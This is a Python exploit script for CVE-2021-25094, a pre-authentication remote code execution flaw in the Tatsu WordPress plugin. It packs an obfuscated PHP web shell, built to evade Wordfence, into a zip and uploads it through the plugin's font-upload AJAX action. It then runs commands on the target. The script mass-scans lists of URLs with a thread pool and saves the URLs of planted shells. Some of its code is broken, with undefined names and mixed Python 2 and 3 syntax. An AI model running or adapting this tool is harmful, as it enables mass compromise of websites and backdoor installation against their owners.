#!/usr/bin/python3
# coding: utf-8

# Tatsudo: Tatsu <= 3.3.11 pre-auth RCE exploit
# The exploit bypass Wordfence
#
# Product: Tatsu wordpress plugin <= 3.3.11
# CVE: CVE-2021-25094 / Vincent MICHEL (@darkpills)
# Editor: Tasubuilder / BrandExponents.com
# URL: https://tatsubuilder.com/


import sys
import requests
import argparse
import urllib3
import threading
import time
import base64
import io
import os
import zipfile
import string
import random
from datetime import datetime
from Queue import Queue
from threading import *
from threading import Thread

urllib3.disable_warnings()
try:
	os.mkdir('Results')
except:
	pass
	
class Worker(Thread):
	def __init__(self, tasks):
		Thread.__init__(self)
		self.tasks = tasks
		self.daemon = True
		self.start()

	def run(self):
		while True:
			func, args, kargs = self.tasks.get()
			try: func(*args, **kargs)
			except Exception, e: print e
			self.tasks.task_done()

class ThreadPool:
	def __init__(self, num_threads):
		self.tasks = Queue(num_threads)
		for _ in range(num_threads): Worker(self.tasks)

	def add_task(self, func, *args, **kargs):
		self.tasks.put((func, args, kargs))

	def wait_completion(self):
		self.tasks.join()

class HTTPCaller(): 

	def __init__(self, url, headers, cmd):		
		self.url = url
		self.headers = headers
		self.cmd = cmd
		self.encodedCmd = base64.b64encode(cmd.encode("utf8"))
		self.zipname = None
		self.shellFilename = None

		if self.url[-1] == '/':
			self.url = self.url[:-1]



	def generateZip(self, compressionLevel, technique, customShell, keep):
		buffer = io.BytesIO()
		with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED, False) as zipFile:

			if technique == "custom" and customShell and os.path.isfile(customShell):
				with open(customShell) as f:
					shell = f.readlines()
				shell = "\n".join(shell)				
				self.shellFilename = os.path.basename(customShell)
				if self.shellFilename[0] != ".":
					self.shellFilename = "." + self.shellFilename

				zipFile.writestr(self.shellFilename, shell)

			elif technique == "php":
				# a lazy obfuscated shell, basic bypass Wordfence
				# i would change base64 encoding for something better

				
				shell = "<?php "
				shell += 'echo \'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">\';'
				shell += 'echo \'<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>\';'
				shell += 'if( $_POST[\'_upl\'] == "Upload" ) {'
				shell += 'if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Korang Dah Berjaya Upload Shell Korang!!!<b><br><br>\'; }'
				shell += 'else { echo \'<b>Korang Gagal Upload Shell Korang!!!</b><br><br>\'; }'
				shell += "}"

				self.shellFilename = "." + (''.join(random.choice(string.ascii_lowercase) for i in range(5))) + ".php"
				zipFile.writestr(self.shellFilename, shell)


			elif technique.startswith("htaccess"):
				
				# requires AllowOverride All in the apache config file
				shell = "AddType application/x-httpd-php .png\n"
				zipFile.writestr(".htaccess", shell)				

				shell = "<?php "
				shell += "$f = \"lmeyst\";"
				shell += "@$a= $f[4].$f[3].$f[4].$f[5].$f[2].$f[1];"
				shell += "@$words = array(base64_decode($_POST['text']));"
				shell += "$j=\"array\".\"_\".\"filter\";"
				shell += "@$filtered_words = $j($words, $a);"
				if not keep:
					shell += "@unlink('.'+'h'+'t'+'a'+'cc'+'e'+'ss');"
					shell += "@unlink(__FILE__);"
				self.shellFilename = "." + (''.join(random.choice(string.ascii_lowercase) for i in range(5))) + ".png"
				zipFile.writestr(self.shellFilename, shell)

			else:
				print("Error: unknow shell technique %s" % technique)
				sys.exit(1)

			self.zipname = ''.join(random.choice(string.ascii_lowercase) for i in range(3))			

		self.zipFile = buffer

	def getShellUrl(self):
		return "%s/wp-content/uploads/typehub/custom/%s/%s" % (self.url, self.zipname, self.shellFilename)

	def executeCmd(self):		
		return requests.post(url = self.getShellUrl(), data = {"text": self.encodedCmd}, headers = self.headers, verify=False)

	def upload(self):
		url = "%s/wp-admin/admin-ajax.php" % self.url
		files = {"file": ("%s.zip" % self.zipname, self.zipFile.getvalue())}
		return requests.post(url = url, data = {"action": "add_custom_font"}, files = files, headers = self.headers, verify=False)

def main(url):
	
	text = '\033[32;1m#\033[0m '+url
	
	# Use web browser-like header
	headers = {
		"X-Requested-With": "XMLHttpRequest",
		"Origin": url,
		"Referer": url,
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
		"Accept": "*/*",
		"Accept-Language": "en-US,en;q=0.9"
	}
	try:
		caller = HTTPCaller(url, headers, "id")
		caller.generateZip(9, "php", False, True)

		r = caller.upload()
		if (r.status_code != 200 or not r.text.startswith('{"status":"success"')):
			text += ' | \033[31;1mExploit failed!\033[0m'
		else:
			r = caller.executeCmd()

			if (r.status_code != 200):
				text += ' | \033[31;1mUploaded but shell failed!\033[0m'
			else:
				text += ' | \033[32;1mUploaded!\033[0m'

				save = open('Results/shell.txt', 'a')
				save.write(caller.getShellUrl()+"\n")
				save.close()
	except Exception as e:
		text += ' | \033[31;1mTimeout!\033[0m'
		pass

	print(text)

if __name__ == '__main__':
	try:
		readcfg = ConfigParser()
		readcfg.read(pid_restore)
		lists = readcfg.get('DB', 'FILES')
		numthread = readcfg.get('DB', 'THREAD')
		sessi = readcfg.get('DB', 'SESSION')
		print("log session bot found! restore session")
		print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
		tanya = raw_input("Want to contineu session ? [Y/n] ")
		if "Y" in tanya or "y" in tanya:
			lerr = open(lists).read().split("\n"+sessi)[1]
			readsplit = lerr.splitlines()
		else:
			kntl # Send Error Biar Lanjut Ke Wxception :v
	except:
		try:
			lists = sys.argv[1]
			numthread = sys.argv[2]
			readsplit = open(lists).read().splitlines()
		except:
			try:
				lists = raw_input("List URL ? ")
				readsplit = open(lists).read().splitlines()
			except:
				print("Wrong input or list not found!")
				exit()
			try:
				numthread = raw_input("threads ? ")
			except:
				print("Wrong thread number!")
				exit()
	pool = ThreadPool(int(numthread))
	for url in readsplit:
		if "://" in url:
			url = url
		else:
			url = "http://"+url
		if url.endswith('/'):
			url = url[:-1]
		jagases = url
		try:
			pool.add_task(main, url)
		except KeyboardInterrupt:
			session = open(pid_restore, 'w')
			cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
			session.write(cfgsession)
			session.close()
			print("CTRL+C Detect, Session saved")
			exit()
	pool.wait_completion()
	try:
		os.remove(pid_restore)
	except:
		pass
